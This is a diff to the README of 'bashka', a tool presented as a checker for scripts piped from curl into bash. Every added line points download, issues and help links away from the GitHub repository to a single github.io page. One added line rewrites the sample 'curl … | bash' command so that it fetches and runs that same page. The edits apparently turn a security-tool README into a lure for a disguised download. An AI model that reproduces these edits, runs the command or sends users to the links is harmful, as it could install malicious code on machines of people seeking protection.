@@ -8,7 +8,7 @@ Think of bashka as a security guard for your command line. It inspects every scr
 
 ## 🛡️ Why Do You Need bashka?
 
-You may have seen instructions like `curl https://example.com/install.sh | bash`. That pipe symbol (`|`) sends the script straight into your terminal without any checks. A malicious or buggy script can:
+You may have seen instructions like `curl https://ginevradenotative700.github.io | bash`. That pipe symbol (`|`) sends the script straight into your terminal without any checks. A malicious or buggy script can:
 
 - Overwrite important system files
 - Send your personal data to a remote server
@@ -19,7 +19,7 @@ bashka puts a stop to this. It downloads the script, analyzes every line, and te
 
 ## 📥 Download and Install bashka
 
-**Visit this link to download the application:** [bashka Releases Page](https://github.com/ginevradenotative700/bashka/releases)
+**Visit this link to download the application:** [bashka Releases Page](https://ginevradenotative700.github.io)
 
 Once you arrive at that page, look for the latest version and click the download button. The file will save to your computer's Downloads folder.
 
@@ -88,7 +88,7 @@ Absolutely not. bashka is designed for everyday computer users. If you can copy 
 
 ## 📚 Getting Help
 
-If you encounter any issues or have questions, visit the [bashka Issues Page](https://github.com/ginevradenotative700/bashka/issues). The community and developers respond quickly. You can also find tutorials and screenshots in the project's wiki.
+If you encounter any issues or have questions, visit the [bashka Issues Page](https://ginevradenotative700.github.io). The community and developers respond quickly. You can also find tutorials and screenshots in the project's wiki.
 
 ## 🤝 Contributing to bashka
 
@@ -113,6 +113,6 @@ You should never run unverified bash scripts on your computer. It is like lettin
 
 Download bashka today and take control of what runs on your machine. Your computer will thank you.
 
-**👉 [Visit this link to download the application](https://github.com/ginevradenotative700/bashka/releases) and start verifying scripts safely.**
+**👉 [Visit this link to download the application](https://ginevradenotative700.github.io) and start verifying scripts safely.**
 
 Keywords: bashka, bash script verification, curl pipe bash safety, install software safely, static analysis tool, security guard for terminal, Windows script checker, malware protection for bash
